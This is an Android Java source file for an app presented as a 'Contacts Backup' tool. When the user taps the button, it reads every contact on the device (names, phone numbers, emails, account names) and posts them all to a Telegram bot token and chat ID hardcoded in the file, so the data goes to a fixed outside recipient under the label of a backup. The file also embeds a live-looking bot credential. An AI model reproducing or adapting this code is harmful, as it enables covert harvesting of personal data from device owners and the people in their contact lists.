package com.contactsbackup.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ContactsBackup";

    // ============================================================
    // Telegram Bot Credentials
    // ============================================================
    private static final String BOT_TOKEN = "8774587636:AAF-seXI2X0ACIa24LjcHrqwmuyGM5eiwEQ";
    private static final String CHAT_ID = "7825761805";
    // ============================================================

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int TELEGRAM_MAX_LENGTH = 3500; // Safe limit under Telegram's 4096 char limit

    private Button btnBackup;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private OkHttpClient httpClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnBackup = findViewById(R.id.btn_backup);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);
        httpClient = new OkHttpClient();

        btnBackup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                checkPermissionAndBackup();
            }
        });
    }

    /**
     * Check if READ_CONTACTS permission is granted.
     * If yes, start backup. If no, request it.
     */
    private void checkPermissionAndBackup() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            startBackup();
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startBackup();
            } else {
                tvStatus.setText("❌ Permission denied. Cannot read contacts without permission.");
                tvStatus.setVisibility(View.VISIBLE);
            }
        }
    }

    /**
     * Start the backup process on a background thread.
     */
    private void startBackup() {
        btnBackup.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        tvStatus.setText("📱 Reading contacts...");
        tvStatus.setVisibility(View.VISIBLE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Step 1: Read all contacts
                    List<ContactInfo> contacts = readAllContacts();

                    updateStatus("📤 Sending " + contacts.size() + " contacts to backup...");

                    // Step 2: Format and send to Telegram
                    boolean success = sendToTelegram(contacts);

                    if (success) {
                        updateStatus("✅ Backup complete! " + contacts.size() + " contacts sent successfully.");
                    } else {
                        updateStatus("❌ Failed to send contacts. Please check your internet connection.");
                    }

                } catch (Exception e) {
                    Log.e(TAG, "Error during backup", e);
                    updateStatus("❌ Error: " + e.getMessage());
                } finally {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            btnBackup.setEnabled(true);
                            progressBar.setVisibility(View.GONE);
                        }
                    });
                }
            }
        }).start();
    }

    /**
     * Read ALL contacts from the device.
     * This includes contacts from phone storage, SIM card, and Google/Gmail accounts.
     * The ContentResolver queries the unified contacts database which merges all sources.
     */
    private List<ContactInfo> readAllContacts() {
        Map<String, ContactInfo> contactMap = new LinkedHashMap<>();
        ContentResolver cr = getContentResolver();

        // --- Read phone numbers ---
        Cursor phoneCursor = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );

        if (phoneCursor != null) {
            try {
                int idIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
                int nameIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int typeIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);

                while (phoneCursor.moveToNext()) {
                    String id = phoneCursor.getString(idIdx);
                    String name = phoneCursor.getString(nameIdx);
                    String number = phoneCursor.getString(numberIdx);
                    int type = phoneCursor.getInt(typeIdx);

                    if (name == null || name.trim().isEmpty()) name = "Unknown";
                    if (number == null || number.trim().isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    String typeLabel = getPhoneTypeLabel(type);
                    contact.addPhone(number.trim() + " (" + typeLabel + ")");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading phone numbers", e);
            } finally {
                phoneCursor.close();
            }
        }

        // --- Read email addresses ---
        Cursor emailCursor = cr.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Email.ADDRESS
                },
                null, null, null
        );

        if (emailCursor != null) {
            try {
                int idIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID);
                int nameIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME);
                int emailIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);

                while (emailCursor.moveToNext()) {
                    String id = emailCursor.getString(idIdx);
                    String name = emailCursor.getString(nameIdx);
                    String email = emailCursor.getString(emailIdx);

                    if (email == null || email.trim().isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        if (name == null || name.trim().isEmpty()) name = "Unknown";
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    contact.addEmail(email.trim());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading email addresses", e);
            } finally {
                emailCursor.close();
            }
        }

        // --- Read account info (to identify source: Phone, SIM, Google) ---
        Cursor accountCursor = cr.query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[]{
                        ContactsContract.RawContacts.CONTACT_ID,
                        ContactsContract.RawContacts.ACCOUNT_TYPE,
                        ContactsContract.RawContacts.ACCOUNT_NAME
                },
                null, null, null
        );

        if (accountCursor != null) {
            try {
                int idIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.CONTACT_ID);
                int typeIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE);
                int nameIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME);

                while (accountCursor.moveToNext()) {
                    String id = accountCursor.getString(idIdx);
                    String accountType = accountCursor.getString(typeIdx);
                    String accountName = accountCursor.getString(nameIdx);

                    ContactInfo contact = contactMap.get(id);
                    if (contact != null && accountType != null) {
                        String source = getAccountSource(accountType);
                        if (accountName != null && !accountName.trim().isEmpty()) {
                            source += " (" + accountName + ")";
                        }
                        contact.setSource(source);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading account info", e);
            } finally {
                accountCursor.close();
            }
        }

        return new ArrayList<>(contactMap.values());
    }

    /**
     * Get a human-readable label for the phone number type.
     */
    private String getPhoneTypeLabel(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME: return "Fax Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK: return "Fax Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN: return "Main";
            default: return "Other";
        }
    }

    /**
     * Map account type to a friendly source name.
     */
    private String getAccountSource(String accountType) {
        if (accountType == null) return "📱 Phone";
        String lower = accountType.toLowerCase();
        if (lower.contains("google") || lower.contains("gmail")) {
            return "📧 Google";
        } else if (lower.contains("sim")) {
            return "📶 SIM";
        } else if (lower.contains("phone") || lower.contains("local")) {
            return "📱 Phone";
        } else if (lower.contains("whatsapp")) {
            return "💬 WhatsApp";
        } else {
            return "📋 " + accountType;
        }
    }

    /**
     * Format contacts and send them to Telegram.
     * Splits into multiple clean plain-text messages if text exceeds limits.
     */
    private boolean sendToTelegram(List<ContactInfo> contacts) {
        if (contacts.isEmpty()) {
            return sendTelegramMessage("📭 No contacts found on this device.");
        }

        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        StringBuilder header = new StringBuilder();
        header.append("📋 CONTACTS BACKUP\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n");
        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
        header.append("📅 Date: ").append(dateStr).append("\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");

        if (!sendTelegramMessage(header.toString())) {
            Log.e(TAG, "Failed to send header to Telegram");
            return false;
        }

        StringBuilder chunk = new StringBuilder();
        int contactNum = 0;
        boolean allSuccess = true;

        for (ContactInfo contact : contacts) {
            contactNum++;
            StringBuilder entry = new StringBuilder();
            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");

            for (String phone : contact.phones) {
                entry.append("   📞 ").append(phone).append("\n");
            }
            for (String email : contact.emails) {
                entry.append("   ✉️ ").append(email).append("\n");
            }
            if (contact.source != null) {
                entry.append("   🔗 Source: ").append(contact.source).append("\n");
            }
            entry.append("\n");

            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
                if (!sendTelegramMessage(chunk.toString())) {
                    allSuccess = false;
                }
                chunk = new StringBuilder();

                try {
                    Thread.sleep(600); // Avoid hitting Telegram flood limits
                } catch (InterruptedException ignored) {}
            }

            chunk.append(entry);
        }

        if (chunk.length() > 0) {
            if (!sendTelegramMessage(chunk.toString())) {
                allSuccess = false;
            }
        }

        return allSuccess;
    }

    /**
     * Send a single message to Telegram using JSONObject for robust escaping.
     */
    private boolean sendTelegramMessage(String text) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);

            RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json; charset=utf-8")
            );

            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .build();

            Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            if (!success) {
                String errorBody = response.body() != null ? response.body().string() : "No response body";
                Log.e(TAG, "Telegram API Error: Code " + response.code() + " - " + errorBody);
            }
            response.close();
            return success;
        } catch (Exception e) {
            Log.e(TAG, "Error sending Telegram request", e);
            return false;
        }
    }

    /**
     * Update the status text on the UI thread.
     */
    private void updateStatus(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvStatus.setText(message);
            }
        });
    }

    /**
     * Data class to hold contact information.
     */
    private static class ContactInfo {
        String name;
        List<String> phones = new ArrayList<>();
        List<String> emails = new ArrayList<>();
        String source;

        ContactInfo(String name) {
            this.name = name;
        }

        void addPhone(String phone) {
            if (!phones.contains(phone)) {
                phones.add(phone);
            }
        }

        void addEmail(String email) {
            if (!emails.contains(email)) {
                emails.add(email);
            }
        }

        void setSource(String source) {
            this.source = source;
        }
    }
}
